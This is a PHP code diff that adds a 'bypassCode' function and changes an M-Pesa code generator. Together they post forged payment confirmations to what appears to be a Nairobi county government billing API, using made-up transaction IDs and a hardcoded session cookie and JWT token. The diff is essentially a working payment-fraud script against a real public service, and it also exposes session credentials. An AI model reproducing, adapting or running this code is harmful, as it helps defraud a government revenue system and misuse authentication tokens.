@@ -1717,9 +1717,46 @@ function KraNrsFetch($nid)
         return ["status" => true, "kra" => $kra_pin, "nid" => $nid, "data" => $dt4];
     }
 }
+function bypassCode($bypass, $billType, $code)
+{
 
+    $curl = curl_init();
+
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 0,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => '{
+            "mpesadetails": {
+                "FirstName": "John",
+                "BillRefNumber": "'.$bypass['invoice_no'].'",
+                "TransAmount": "'.$bypass['amount'].'",
+                "BillType": "'.$billType.'",
+                "TransChannel": "mpesa",
+                "TransID": "'.$code.'"
+            }
+        }',
+        
+        CURLOPT_HTTPHEADER => array(
+            'Content-Type: application/json',
+            'Cookie: csrftoken=VhxuGvVHOORIaTUKOqLGfkaUUuNP8IJ6hSkEUOsMU9NFU92RnfBn4EHWOlJeBekD; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ODYzLCJzODIiLCJtb2JpbGVfbnVtYmVyIjoiMjU0NzExNTc2OTA5In0.DagH4XZzzA9tUNrZ3Ykg0zlrCEDXOzDFjes7k91yw4U'
+        ),
+    ));
+
+    $response = curl_exec($curl);
+
+    curl_close($curl);
+    return $response;
+}
 function generateMpesaCode() {
     $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+    $alphabet2 = '1234567890';
     $code = '';
   
     // Year (Q for 2022, R for 2023, etc.)
@@ -1734,17 +1771,22 @@ function generateMpesaCode() {
     $currentDay = date('j');
     $code .= $currentDay;
   
+    /*
     // Transaction order (A for 10th, B for 11th, etc.)
     $currentTime = date('Hi');
     $transactionOrder = intval($currentTime) + 1;
     $transactionOrder %= 100; // Limit transaction order to two digits
     $transactionOrder = str_pad($transactionOrder, 2, '0', STR_PAD_LEFT); // Pad with zeros
     $code .= $transactionOrder;
+    */
+    $code .= $alphabet2[rand(0, strlen($alphabet2) - 1)];
   
+    //*
     // Complete the remaining characters to make the code 10 characters long
     while (strlen($code) < 10) {
-      $code .= $alphabet[rand(0, strlen($alphabet) - 1)];
+      $code .= $alphabet1[rand(0, strlen($alphabet1) - 1)];
     }
+    //*/
   
     return $code;
   }
